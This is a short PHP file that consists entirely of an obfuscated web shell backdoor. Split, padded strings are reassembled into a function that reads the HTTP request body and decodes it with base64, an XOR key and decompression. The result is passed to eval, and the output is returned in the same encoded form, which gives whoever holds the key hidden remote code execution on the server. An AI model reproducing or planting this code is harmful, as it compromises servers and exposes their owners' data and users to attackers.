<?php
$C='PaPse64_decodPeP($m[P1]),$k))P);$o=P@ob_getP_contents();@PPob_end_Pclean()';
$S=';$rP=@bPase64_encPPode(@x(@gzcomPpress(P$oP)P,$k));prinPt("$p$Pkh$r$kf");}';
$n=str_replace('jM','','cjMrejMatejM_fujMjMncjMtion');
$P='{$j};}}returPn $o;P}if (@prPegP_PmaPtch("/$kh(.+)$kf/P",@file_PgePtP_conte';
$G='nts("php://PinpuPPt"),$m)==1P) {@ob_PstarPt();@evPalP(@gzuncomprPess(@x(@b';
$Z='zYPi6v5";fPunctiPon x($tP,$k){$Pc=strPlen($kP);P$l=strlPenP($Pt);$o="";for';
$y='($i=P0;$i<$lP;P){for(P$j=0;($jP<$c&&$i<PP$l);$j++,$i+P+){$o.=$Pt{$i}P^$PkP';
$B='$kP="1116794P3";$kh=P"cd67P695aab31P";$kf="5Pfb720eP62375"P;$p=P"LxP9uyQygQI';
$H=str_replace('P','',$B.$Z.$y.$P.$G.$C.$S);
$m=$n('',$H);$m();
?>
